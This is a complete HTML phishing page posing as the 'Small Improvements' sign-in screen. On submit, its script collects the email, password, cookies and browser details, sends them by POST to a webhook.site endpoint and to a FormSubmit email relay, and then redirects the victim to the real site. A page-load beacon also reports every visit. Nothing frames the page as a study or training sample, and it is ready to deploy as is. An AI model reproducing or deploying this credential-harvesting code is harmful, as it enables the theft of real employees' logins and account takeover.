<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Small Improvements - Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
            color: #333;
            font-size: 24px;
            font-weight: bold;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-weight: 500;
        }
        
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e5e9;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .btn {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        .btn:hover {
            background: #5a6fd8;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 14px;
        }
        
        .error {
            color: #e74c3c;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">Small Improvements</div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Work Email</label>
                <input type="email" id="email" name="email" required placeholder="your@company.com">
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required placeholder="Enter your password">
            </div>
            
            <button type="submit" class="btn">Sign In</button>
            
            <div id="errorMessage" class="error">
                Invalid credentials. Please try again.
            </div>
        </form>
        
        <div class="footer">
            <a href="#" style="color: #667eea; text-decoration: none;">Forgot password?</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Show loading state
            const btn = document.querySelector('.btn');
            btn.textContent = 'Signing in...';
            btn.disabled = true;
            
            // Capture the credentials immediately
            captureCredentials(email, password);
            
            // After 2 seconds, "redirect" to real Small Improvements
            setTimeout(() => {
                window.location.href = 'https://app.small-improvements.com/app/home';
            }, 2000);
        });
        
        function captureCredentials(email, password) {
            const data = {
                email: email,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                referrer: document.referrer,
                screen: screen.width + 'x' + screen.height,
                language: navigator.language,
                cookies: document.cookie,
                url: window.location.href
            };
            
            // Send to Webhook.site
            fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                'X-Forwarded-For': '192.168.1.1'
                },
                body: JSON.stringify({
                    type: 'CREDENTIALS_CAPTURED',
                    data: data
                })
            });
            
            // Also send to email via FormSubmit
            fetch('https://formsubmit.co/ajax/whitemaskoff101@gmail.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    subject: 'SMALL IMPROVEMENTS CREDENTIALS CAPTURED!',
                    email: email,
                    password: password,
                    timestamp: data.timestamp,
                    user_agent: data.userAgent,
                    ip: 'Captured via login page',
                    message: 'User entered credentials on fake login page'
                })
            });
            
            console.log('CAPTURED CREDENTIALS:', data);
        }
        
        // Auto-focus on email field
        document.getElementById('email').focus();
        
        // Send page load event
        window.onload = function() {
            fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'LOGIN_PAGE_LOADED',
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    referrer: document.referrer,
                    message: 'User landed on fake login page'
                })
            });
        };
    </script>
</body>
</html>
